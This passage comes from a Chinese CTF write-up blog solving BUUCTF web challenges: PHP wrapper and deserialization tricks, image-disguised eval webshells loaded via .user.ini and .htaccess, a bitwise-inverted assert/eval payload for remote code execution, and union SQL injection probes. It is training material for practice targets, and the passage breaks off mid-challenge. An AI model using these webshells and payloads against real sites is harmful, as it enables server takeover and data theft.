<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220823000303547.png"><img src="/wp-buuctf/image-20220823000303547.png" alt="image-20220823000303547"></a></p>
<p>得到flag</p>
<h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先分析一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//r为读取权限</span></span><br></pre></td></tr></table></figure>

<p>file_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为<code>welcome to the zjctf</code></p>
<p>但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过</p>
<p>这里就可以利用两个伪协议，php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;，这两个一个是读取post数据，一个是读取get数据，这里用data:&#x2F;&#x2F;协议</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>

<p>当然这里不用base64也可以</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure>

<p>第二个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure>

<p>一个文件包含，尝试用php:&#x2F;&#x2F;filter读取<code>useless.php</code></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&amp;<span class="keyword">file</span>=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=conver.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>至于password，猜测应该是在useless.php里才有线索，先赋值1看看</p>
<p>于是先构造一个payload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=useless.php&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到<code>useless.php</code>内容</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220823175723137.png"><img src="/wp-buuctf/image-20220823175723137.png" alt="image-20220823175723137"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">解码后</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>再看看password变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure>
<p>这里用了反序列化，所以password就是序列化后的值</p>
<p>利用<code>useless.php</code>构造序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>运行后        </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure>

<p>最后payload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//仔细一下会注意到这里的file的值中，伪协议删除了，</span><br><span class="line">这是因为开始默认都是<span class="keyword">index</span>.php，但是<span class="keyword">index</span>.php没有Flag类，</span><br><span class="line">如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的</span><br><span class="line">所以这里删除file里的伪协议，只留useless.php的文件名</span><br><span class="line">就是利用  <span class="keyword">include</span>($file); </span><br><span class="line">把useless.php包含在<span class="keyword">index</span>.php里，从而可以成功执行反序列化，得到flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先上传一个文本文件试试</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825173012665.png"><img src="/wp-buuctf/image-20220825173012665.png" alt="image-20220825173012665"></a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">exif_imagetype是判断一个图像的类型的进程。</span><br></pre></td></tr></table></figure>

<p>所以只能上传图片</p>
<p>先上传一个包含PHP木马的图片马试试</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825174837632.png"><img src="/wp-buuctf/image-20220825174837632.png" alt="image-20220825174837632"></a></p>
<p>看来是过滤了<code>&lt;?</code>，所以除了php,其他的asp,aspx,jsp,js都可以绕过</p>
<p>这里以js举例</p>
<p>创建一个js文件，内容为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在和一个普通图片合成，也可以加个文件头GIF89a</p>
<p>图片马名为<code>haha.gif</code></p>
<p>然后上传</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825210858681.png"><img src="/wp-buuctf/image-20220825210858681.png" alt="image-20220825210858681"></a></p>
<p>由于不是php木马，所以无法用<code>.htaccess</code>文件绕过</p>
<p>这里就需要用<code>.user.ini</code>配置文件,当然使用前提是<code>.user.ini</code>文件下有php文件，不然也不能包含了</p>
<p>推荐看一下这篇<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>所以这里设置自动包含的文件为<code>haha.gif</code></p>
<p>于是<code>.user.ini</code>内容为</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a       <span class="comment">//绕过图片判断         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure>

<p>上传<code>.user.ini</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825214029074.png"><img src="/wp-buuctf/image-20220825214029074.png" alt="image-20220825214029074"></a></p>
<p>这个时候haha.gif就已经包含在index.php，可以访问</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure>

<p>能看到<code>GIF98a?</code></p>
<p>然后也可以用hackbar，post上传命令，如图中的phpinfo()</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825215617387.png"><img src="/wp-buuctf/image-20220825215617387.png" alt="image-20220825215617387"></a></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//看看根目录，找到flag</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825220933577.png"><img src="/wp-buuctf/image-20220825220933577.png" alt="image-20220825220933577"></a></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//读取flag文件</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825221229971.png"><img src="/wp-buuctf/image-20220825221229971.png" alt="image-20220825221229971"></a></p>
<hr>
<p>当然用蚁剑最简单，连接也成功</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825214728996.png"><img src="/wp-buuctf/image-20220825214728996.png" alt="image-20220825214728996"></a></p>
<p>可以看到<strong>index.php文件也在上传的目录</strong>下，也就是<code>.user.ini</code>的同一个目录下，所以才可以成功包含</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825215454619.png"><img src="/wp-buuctf/image-20220825215454619.png" alt="image-20220825215454619"></a></p>
<p>在根目录发现了flag，打开即可得到flag</p>
<hr>
<p>但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825215047906.png"><img src="/wp-buuctf/image-20220825215047906.png" alt="image-20220825215047906"></a></p>
<p>这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825215220524.png"><img src="/wp-buuctf/image-20220825215220524.png" alt="image-20220825215220524"></a></p>
<p>这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220825220024393.png"><img src="/wp-buuctf/image-20220825220024393.png" alt="image-20220825220024393"></a></p>
<p>根目录得到flag</p>
<h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题不难，但是开始不清楚还是不知道过滤了什么，</p>
<p>这道题介绍几个点就可以了</p>
<p>第一个是过滤了后缀名含ph</p>
<p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>
<p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>
<p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>再上传.htaccess文件，解析所有文件为php</p>
<p>用蚁剑连接jpeg文件，即可</p>
<h2 id="11-极客大挑战-2019-RCE-ME"><a href="#11-极客大挑战-2019-RCE-ME" class="headerlink" title="11.[极客大挑战 2019]RCE ME"></a>11.[极客大挑战 2019]RCE ME</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>先对代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到code被正则匹配，所以字母大小写和数字都不能输入</p>
<p>这里就学到新东西了</p>
<p><strong>取反绕过</strong></p>
<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span></span><br></pre></td></tr></table></figure>

<p>然后再赋值</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意后面要有；，代表php代码结束</span></span><br><span class="line"><span class="comment">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)因为是assert是函数，被当作函数执行，于是因为断言(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))，所以把<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])当作php执行，于是就可以拿到shell了</span><br></pre></td></tr></table></figure>



<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">蚁剑连接</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>但是发现flag是空的</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220903181221552.png"><img src="/wp-buuctf/image-20220903181221552.png" alt="image-20220903181221552"></a></p>
<p>看了其他大佬的wp才知道，需要蚁剑插件<code>disable_functions</code>，禁止网站的函数，防止其阻止读取flag</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220903181348649.png"><img src="/wp-buuctf/image-20220903181348649.png" alt="image-20220903181348649"></a></p>
<p>再在主页右键</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220903181431745.png"><img src="/wp-buuctf/image-20220903181431745.png" alt="image-20220903181431745"></a></p>
<p>模式选择</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220903181451266.png"><img src="/wp-buuctf/image-20220903181451266.png" alt="image-20220903181451266"></a></p>
<p>然后点击开始</p>
<p>终端输入</p>
<p><code>/readflag</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220903181528195.png"><img src="/wp-buuctf/image-20220903181528195.png" alt="image-20220903181528195"></a></p>
<p>得到flag</p>
<h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始是一个登录框</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909203922998.png"><img src="/wp-buuctf/image-20220909203922998.png" alt="image-20220909203922998"></a></p>
<p>我们随便输入一个账号密码</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">账号：<span class="literal">admin</span></span><br><span class="line">密码：<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909204018695.png"><img src="/wp-buuctf/image-20220909204018695.png" alt="image-20220909204018695"></a></p>
<p>报错，看来用户名没错，密码错误</p>
<p>查看源码看看</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909204046072.png"><img src="/wp-buuctf/image-20220909204046072.png" alt="image-20220909204046072"></a></p>
<p>发现有一串加密字符，看起来像base</p>
<p>先用<code>base32</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909204202994.png"><img src="/wp-buuctf/image-20220909204202994.png" alt="image-20220909204202994"></a></p>
<p>看起来就是<code>base32+base64</code>混合编码，再用<code>base64</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909204325138.png"><img src="/wp-buuctf/image-20220909204325138.png" alt="image-20220909204325138"></a></p>
<hr>
<p>当然看不出来，直接无脑<code>ciphey</code>，也可以，当然还是需要了解不同编码和加密字符的特点</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909204746167.png"><img src="/wp-buuctf/image-20220909204746167.png" alt="image-20220909204746167"></a></p>
<p>也可以得到解码结果</p>
<hr>
<p>由</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可知，sql注入点在Username处，且为单引号闭合</p>
<p>于是我们尝构造注入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909205630033.png"><img src="/wp-buuctf/image-20220909205630033.png" alt="image-20220909205630033"></a></p>
<p>发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试</p>
<p>我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）</p>
<p>大概统计一下</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p>所以我们只有先试试联合注入</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">由于过滤了or</span><br><span class="line">所以我们不能使用<span class="keyword">order</span> <span class="keyword">by</span>来判断列数，可以用联合注入，利用<span class="keyword">select</span>的结果来判断</span><br></pre></td></tr></table></figure>

<p>先试试<code>select 1,2</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909214254664.png"><img src="/wp-buuctf/image-20220909214254664.png" alt="image-20220909214254664"></a></p>
<p>发现报错，列数有问题</p>
<p>再试试<code>select 1,2,3</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909214345515.png"><img src="/wp-buuctf/image-20220909214345515.png" alt="image-20220909214345515"></a></p>
<p>发现虽然没有报错，但是也没有直接回显</p>
